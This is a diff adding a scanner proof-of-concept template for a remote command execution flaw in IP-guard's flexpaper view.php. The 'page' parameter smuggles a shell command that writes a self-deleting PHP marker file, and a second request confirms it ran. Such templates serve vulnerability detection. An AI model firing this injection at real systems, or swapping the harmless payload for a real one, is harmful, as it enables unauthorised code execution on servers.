@@ -1,0 +1,26 @@
+name: poc-yaml-ip-guard-view-rce
+manual: true
+transport: http
+set:
+    rStr0: randomLowercase(8)
+    rInt1: randomInt(10000, 99999)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+echo+"{{rStr0}}";+unlink(__FILE__);+?^>>{{rInt1}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("application/x-shockwave-flash")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /ipg/static/appr/lib/flexpaper/php/{{rInt1}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(rStr0)
+expression: r0() && r1()
+detail:
+    author: agap0rn15
+    links:
+        - https://stack.chaitin.com/vuldb/detail/a3fe58a9-ae2d-41e0-b0e2-d5a40cf3003e
